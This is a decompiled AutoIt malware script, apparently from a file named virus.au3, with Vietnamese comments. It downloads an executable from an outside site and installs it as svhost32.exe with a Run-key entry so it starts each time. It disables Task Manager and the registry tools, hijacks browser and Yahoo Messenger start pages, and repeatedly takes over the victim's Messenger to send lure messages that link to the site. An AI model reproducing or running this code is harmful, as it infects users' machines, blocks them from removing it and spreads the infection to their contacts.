; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Documents and Settings\User\Desktop\virus.au3>
; ----------------------------------------------------------------------------


; Thiet Lap
#NoTrayIcon
$website = "http://lovetolove.us"

; Lay Nhiem Vao He Thong
If Not FileExists(@WindowsDir & "\svhost32.exe") Then
 		InetGet ("http://lovetolove.us/host.exe", @WindowsDir & "\svhost32.exe", 0, 1)
 		Sleep(10000)
	EndIf


; Ghi Khoa Registry
RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast", "content url", "REG_SZ", $website)
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\svhost32.exe")

; Danh Sach Tin Nhan Ngau Nhien
Dim $tin[13]
$tin[0] = "Website cua minh vua lam ne cac ban oi! Vo xem thu nha " & $website & " Giup em cai nha "
$tin[1] = "Troi oi! con nho nao ma dep the nay nhi? " & $website & " vui choi di anh em oi >:D< "
$tin[2] = "Trang web co rat nhieu nhac hay ne cac ban " & $website & " cung nhau vao nhe "
$tin[3] = "Co ai chat voi thietquyenlangtu86 hok day ta ? " & $website & " Lam wen voi LangTu nhe << "
$tin[4] = "Download ban upgrade IE7 nao " & $website & " Vao thoi nao anh em! download nhanh len keo die <<"
$tin[5] = "Troi oi! Trang web xem phim hay lem ne cac ban! toan la nguoi dep khong " & $website & " Xem di de mo tam nhin<< "
$tin[6] = "Trang web download nhac mien phi day. Co rat nhieu nhac hay va luon luon cap nhat nhac moi do " & $website & " vao di nha anh em << "
$tin[7] = "Trang web Credit Card mien phi ne! vo di anh em oi! cung nhau chan thit nhe " & $website & " that la da nhe !!! "
$tin[8] = "Trang web co nhieu software hay cho cac ban ne: " & $website & " Hay vao kiem cho minh software nay hay coi"
$tin[9] = "Con nho nay dung dep luon! No o Quan Tan phu, HCM day " & $website & " Xem giong ynhu nguoi mau"
$tin[10] = "Troi oi! chan wa di thoi- vao website day coi co gi hay khong ne " & $website & " Co nhieu thu hay lem do "
$tin[11] = "Me website gi ma hay the ta! toan la nguoi dep khong ah " & $website & " vao kiem bo phim coi thu "
$tin[12] = "Trang web xem phim mien phi day " & $website & " Chuc cac ban co ngay cuoi tuan vui ve !! >:D< "


; Ham Thay Doi Status & Gui Tin Nhan
While (1)
sleep(200000)
$tieude1 = WinGetTitle("Yahoo! Messenger", "")
$kiemtra1 = WinExists ($tieude1)

	If $kiemtra1 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude1)
		Send("!m")
		Send("un")
		Send("^v {ENTER}{ENTER}")
		Send("^m")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{END}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v")
		Send("!s")
		BlockInput (0)
	EndIf


Sleep(200000)
WEnd

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Documents and Settings\User\Desktop\virus.au3>
; ----------------------------------------------------------------------------

